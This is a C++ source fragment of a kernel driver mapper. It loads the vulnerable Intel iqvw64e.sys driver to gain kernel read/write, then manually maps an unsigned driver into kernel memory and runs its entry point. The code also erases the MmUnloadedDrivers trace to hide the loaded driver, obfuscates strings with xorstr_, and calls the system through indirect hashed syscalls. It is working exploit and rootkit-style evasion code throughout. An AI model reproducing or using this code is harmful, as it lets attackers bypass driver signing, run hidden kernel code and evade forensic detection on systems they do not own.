        // Structure: ULONG_PTR HandleCount; ULONG_PTR Reserved; SYSTEM_HANDLE[] Handles
        ULONG_PTR handleCount = *(ULONG_PTR*)buf;
        BYTE* entries = buf + sizeof(ULONG_PTR) * 2; // skip count + reserved
        // Each SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX is 40 bytes on x64
        // Object at +0, UniqueProcessId at +8, HandleValue at +16

        DWORD myPid = (DWORD)(ULONG_PTR)
#if defined(_M_X64)
            __readgsdword(0x40); // TEB->ClientId.UniqueProcess (low 32 bits)
#else
            __readfsdword(0x20);
#endif

        uint64_t objectAddr = 0;
        for (ULONG_PTR i = 0; i < handleCount; i++) {
            BYTE* entry = entries + (i * 40);
            uint64_t obj = *(uint64_t*)(entry + 0);
            ULONG_PTR pid = *(ULONG_PTR*)(entry + 8);
            ULONG_PTR handleVal = *(ULONG_PTR*)(entry + 16);

            if ((DWORD)pid == myPid && (HANDLE)handleVal == g_hDevice) {
                objectAddr = obj;
                break;
            }
        }

        SIZE_T fs = 0; ISYSCALL(NtFreeVirtualMemory)((HANDLE)-1, (PVOID*)&buf, &fs, (ULONG)0x8000);
        if (!objectAddr) return false;

        // FILE_OBJECT->DeviceObject at +0x8
        uint64_t deviceObject = 0;
        if (!ReadKernelMemory(objectAddr + 0x8, &deviceObject, 8) || !deviceObject) return false;
        // DEVICE_OBJECT->DriverObject at +0x8
        uint64_t driverObject = 0;
        if (!ReadKernelMemory(deviceObject + 0x8, &driverObject, 8) || !driverObject) return false;
        // DRIVER_OBJECT->DriverSection at +0x28
        uint64_t driverSection = 0;
        if (!ReadKernelMemory(driverObject + 0x28, &driverSection, 8) || !driverSection) return false;
        // KLDR_DATA_TABLE_ENTRY->BaseDllName at +0x58
        USHORT nameLen = 0;
        if (!ReadKernelMemory(driverSection + 0x58, &nameLen, 2)) return false;
        // Zero the Length to prevent MiRememberUnloadedDriver
        USHORT zero = 0;
        return WriteKernelMemory(driverSection + 0x58, &zero, 2);
    }

    // =============================================
    //  PE Mapping — relocate and resolve imports
    // =============================================

    __declspec(noinline) bool MapDriverToKernel(
        BYTE* driverData, DWORD driverSize,
        uint64_t param1, uint64_t param2,
        NTSTATUS* outStatus)
    {
        // Parse PE headers
        auto dos = (IMAGE_DOS_HEADER*)driverData;
        if (dos->e_magic != IMAGE_DOS_SIGNATURE) return false;
        auto nt = (IMAGE_NT_HEADERS64*)(driverData + dos->e_lfanew);
        if (nt->Signature != IMAGE_NT_SIGNATURE) return false;
        if (nt->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) return false;

        DWORD imageSize = nt->OptionalHeader.SizeOfImage;
        DWORD headerSize = (IMAGE_FIRST_SECTION(nt))->VirtualAddress;
        DWORD allocSize = imageSize - headerSize; // skip PE header

        // Allocate local buffer
        BYTE* localImage = NULL;
        SIZE_T localAllocSz = (SIZE_T)imageSize;
        ISYSCALL(NtAllocateVirtualMemory)(
            (HANDLE)-1, (PVOID*)&localImage, (ULONG_PTR)0,
            &localAllocSz, (ULONG)0x3000, (ULONG)0x04);
        if (!localImage) return false;

        // Copy headers + sections locally
        memcpy(localImage, driverData, nt->OptionalHeader.SizeOfHeaders);
        auto sec = IMAGE_FIRST_SECTION(nt);
        for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
            if (sec[i].Characteristics & IMAGE_SCN_CNT_UNINITIALIZED_DATA) continue;
            if (sec[i].SizeOfRawData == 0) continue;
            memcpy(localImage + sec[i].VirtualAddress,
                   driverData + sec[i].PointerToRawData,
                   sec[i].SizeOfRawData);
        }

        // Allocate kernel pool
        uint64_t kernelPool = AllocatePool(allocSize);
        if (!kernelPool) {
            SIZE_T fs = 0; ISYSCALL(NtFreeVirtualMemory)((HANDLE)-1, (PVOID*)&localImage, &fs, (ULONG)0x8000);
            return false;
        }

        // kernel_image_base = pool minus header offset (conceptual base)
        uint64_t kernelBase = kernelPool - headerSize;

        // Apply relocations
        DWORD relocRva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
        DWORD relocSize = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
        if (relocRva && relocSize) {
            int64_t delta = (int64_t)(kernelBase - nt->OptionalHeader.ImageBase);
            BYTE* relocPtr = localImage + relocRva;
            BYTE* relocEnd = relocPtr + relocSize;

            while (relocPtr < relocEnd) {
                auto block = (IMAGE_BASE_RELOCATION*)relocPtr;
                if (block->SizeOfBlock == 0) break;
                DWORD entryCount = (block->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
                WORD* entries = (WORD*)(relocPtr + sizeof(IMAGE_BASE_RELOCATION));

                for (DWORD i = 0; i < entryCount; i++) {
                    WORD type = entries[i] >> 12;
                    WORD offset = entries[i] & 0xFFF;
                    if (type == IMAGE_REL_BASED_DIR64) {
                        uint64_t* patchAddr = (uint64_t*)(localImage + block->VirtualAddress + offset);
                        *patchAddr += delta;
                    }
                }
                relocPtr += block->SizeOfBlock;
            }
        }

        // Resolve imports
        DWORD impRva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
        if (impRva) {
            auto impDesc = (IMAGE_IMPORT_DESCRIPTOR*)(localImage + impRva);
            while (impDesc->Name) {
                const char* modName = (const char*)(localImage + impDesc->Name);
                uint64_t modBase = GetKernelModuleAddress(modName);
                if (!modBase) {
                    // Fallback to ntoskrnl
                    modBase = g_NtoskrnlAddr;
                }

                auto thunk = (IMAGE_THUNK_DATA64*)(localImage + impDesc->FirstThunk);
                auto origThunk = impDesc->OriginalFirstThunk ?
                    (IMAGE_THUNK_DATA64*)(localImage + impDesc->OriginalFirstThunk) : thunk;

                while (origThunk->u1.AddressOfData) {
                    if (!(origThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG64)) {
                        auto byName = (IMAGE_IMPORT_BY_NAME*)(localImage + (DWORD)origThunk->u1.AddressOfData);
                        uint64_t funcAddr = GetKernelModuleExport(modBase, byName->Name);
                        if (!funcAddr && modBase != g_NtoskrnlAddr) {
                            funcAddr = GetKernelModuleExport(g_NtoskrnlAddr, byName->Name);
                        }
                        if (funcAddr) {
                            thunk->u1.Function = funcAddr;
                        } else {
                            // Zero unresolved imports to avoid jumping to garbage addresses
                            thunk->u1.Function = 0;
                        }
                    }
                    thunk++;
                    origThunk++;
                }
                impDesc++;
            }
        }

        // Write to kernel (skip headers)
        bool writeOk = WriteKernelMemory(kernelPool, localImage + headerSize, allocSize);
        if (!writeOk) {
            FreePool(kernelPool);
            SIZE_T fs = 0; ISYSCALL(NtFreeVirtualMemory)((HANDLE)-1, (PVOID*)&localImage, &fs, (ULONG)0x8000);
            return false;
        }

        // Call DriverEntry
        uint64_t entryPoint = kernelBase + nt->OptionalHeader.AddressOfEntryPoint;
        NTSTATUS drvStatus = 0;
        bool callOk = CallKernel2(&drvStatus, entryPoint, param1, param2);

        if (outStatus) *outStatus = drvStatus;

        // Free kernel pool (driver has completed)
        FreePool(kernelPool);

        // Free local buffer
        SIZE_T fs = 0;
        ISYSCALL(NtFreeVirtualMemory)((HANDLE)-1, (PVOID*)&localImage, &fs, (ULONG)0x8000);

        return callOk;
    }

    // =============================================
    //  Main entry: Load vuln driver, map target, clean up
    // =============================================

    __declspec(noinline) bool LoadAndMap(
        BYTE* vulnDriverData, DWORD vulnDriverSize,     // iqvw64e.sys in memory
        BYTE* targetDriverData, DWORD targetDriverSize,  // DeepScan.sys in memory
        NTSTATUS* outStatus)
    {
        // 1. Load vulnerable driver as service (writes to disk, NtLoadDriver)
        if (!LoadVulnDriver(vulnDriverData, vulnDriverSize)) {
                        return false;
        }

        // 2. Open device
        if (!OpenDevice()) {
                        UnloadVulnDriver();
            return false;
        }

        // 3. Get ntoskrnl address
        g_NtoskrnlAddr = GetKernelModuleAddress(xorstr_("ntoskrnl.exe"));
        if (!g_NtoskrnlAddr) {
                        UnloadVulnDriver();
            return false;
        }

        // 4. Verify ntoskrnl is readable
        IMAGE_DOS_HEADER dosCheck = {};
        if (!ReadKernelMemory(g_NtoskrnlAddr, &dosCheck, sizeof(dosCheck)) ||
            dosCheck.e_magic != IMAGE_DOS_SIGNATURE) {
                        UnloadVulnDriver();
            return false;
        }

        // 5. Resolve NtAddAtom (kernel + user)
        g_KernelNtAddAtom = GetKernelModuleExport(g_NtoskrnlAddr, xorstr_("NtAddAtom"));
        if (!g_KernelNtAddAtom) {
                        UnloadVulnDriver();
            return false;
        }

        // Get usermode NtAddAtom from saved ntdll base
        constexpr DWORD H_NtAddAtom = Syscall::Hash("NtAddAtom");
        g_UserNtAddAtom = FindNtdllExportByHash(::g_LocalNtdllBase, H_NtAddAtom);
        if (!g_UserNtAddAtom) {
                        UnloadVulnDriver();
            return false;
        }

        // 6. Clear MmUnloadedDrivers (prevents trace)
        ClearMmUnloadedDrivers();

        // 7. Map target driver directly from memory (no disk needed)
        bool result = MapDriverToKernel(targetDriverData, targetDriverSize, 0, 0, outStatus);
        if (!result) {
                    }

        // 8. Unload vulnerable driver + cleanup
        UnloadVulnDriver();

        return result;
    }

} // namespace DriverMapper
